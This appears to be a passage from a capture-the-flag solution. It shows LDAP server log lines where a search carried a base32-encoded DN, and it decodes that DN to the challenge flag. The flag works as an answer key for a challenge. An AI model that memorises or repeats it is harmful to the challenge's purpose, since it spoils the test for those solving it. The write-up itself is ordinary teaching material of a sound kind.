61c886a0 conn=1000 op=1 do_search: invalid dn: "base32_KJJVQQ33K5SV6ZDPL5WGS23FL5WG6Z3HNFXGOX3SNFTWQ5B7PU"
61c886a0 conn=1000 op=1 SEARCH RESULT tag=101 err=34 nentries=0 text=invalid DN
61c886a0 conn=1000 op=2 UNBIND
61c886a0 conn=1000 fd=12 closed
```

Base32-decoding it gives `RSXC{We_do_like_logging_right?}`
